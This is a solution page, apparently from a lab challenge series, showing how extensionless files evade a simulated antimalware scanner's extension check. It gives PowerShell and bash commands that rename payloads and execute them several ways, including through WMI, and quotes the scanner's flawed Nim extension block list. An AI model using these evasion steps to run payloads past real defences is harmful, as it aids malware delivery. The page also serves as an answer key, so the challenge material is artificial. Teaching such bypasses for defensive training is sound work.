---
title: "Solution 23: No Extension (Extensionless Executable)"
challenge_number: 23
difficulty: easy
category: "Extension Heuristic Bypass"
permalink: /solutions/23-no-extension/
---

# Solution: No Extension (Extensionless Executable)

[Back to Challenge](../challenges/23-no-extension.md)

## Overview

If a file has no dot in its name, the scanner's `rfind('.')` returns -1, and the extracted extension is an empty string. An empty string is not in the suspicious extensions list, so no warning is produced. The file can still be executed directly on Windows and Linux.

## Working Code

### Creating an Extensionless Executable

```powershell
# Copy a real executable, removing the extension
Copy-Item -Path "C:\Windows\System32\calc.exe" -Destination ".\calculator"

# Or copy your own payload
Copy-Item -Path ".\payload.exe" -Destination ".\payload"

# Verify no extension
Get-Item ".\payload" | Select-Object Name, Extension
# Name: payload
# Extension: (empty)
```

### Executing an Extensionless File

```powershell
# Method 1: cmd /c (CMD resolves PATHEXT, but explicit path works)
cmd /c .\payload

# Method 2: Start-Process
Start-Process -FilePath ".\payload"

# Method 3: Direct invocation (PowerShell requires explicit path)
& ".\payload"

# Method 4: Using Invoke-Item
Invoke-Item ".\payload"

# Method 5: WMI Process Create
([wmiclass]"Win32_Process").Create("$PWD\payload")
```

### Linux / Cross-Platform

```bash
# On Linux, extensions are irrelevant for execution
cp payload.elf payload
chmod +x payload
./payload

# Even works with scripts (shebang line determines interpreter)
cat > runme << 'EOF'
#!/bin/bash
echo "Executed without extension"
whoami
EOF
chmod +x runme
./runme
```

### PowerShell Script Without Extension

```powershell
# Write a PS1 script without the .ps1 extension
@'
Write-Host "This script has no extension"
Get-Process | Select-Object -First 5
'@ | Set-Content ".\myscript"

# Execute it explicitly with PowerShell
powershell -File ".\myscript"
# Or:
powershell -Command "& { . .\myscript }"
```

### Batch Logic Without Extension

```powershell
# Create a batch file without .bat/.cmd extension
@"
@echo off
echo Batch payload executed
whoami
"@ | Set-Content ".\runbatch"

# Execute via cmd
cmd /c type .\runbatch | cmd
# Or pipe to cmd:
Get-Content .\runbatch | cmd
```

## Why It Works

The scanner extracts extensions using:

```nim
let dotPos = filename.rfind('.')
if dotPos == -1:
    # No dot found — extension is empty string
    let ext = ""
```

The comparison logic then checks:

```nim
if ext in ["exe", "bat", "cmd", "ps1", "vbs", "js", "wsf", "scr", "pif", "com", "hta"]:
    warn(...)
```

An empty string `""` is **not** in the list, so no warning is generated. The scanner has no concept of "a file with no extension might be executable." It only pattern-matches against known extension strings.

On the execution side:
- Windows PE loader doesn't care about extensions — it checks the MZ/PE headers
- `CreateProcess` API accepts any filename regardless of extension
- Linux never used extensions for executability (it uses the execute permission bit and magic bytes/shebang)

## How to Verify

1. Create an extensionless copy of an executable:
   ```powershell
   Copy-Item "C:\Windows\System32\whoami.exe" -Destination ".\testfile"
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe testfile
   ```

3. Expected result: **No extension warning** — the scanner finds no dot, extracts empty string, no match.

4. Verify the file still executes:
   ```powershell
   & ".\testfile"
   # Output: DOMAIN\username
   ```

5. Compare with the same file having an extension:
   ```powershell
   Copy-Item ".\testfile" -Destination ".\testfile.exe"
   nim_antimalware_sim.exe testfile.exe
   ```
   This produces the extension warning for `.exe`.
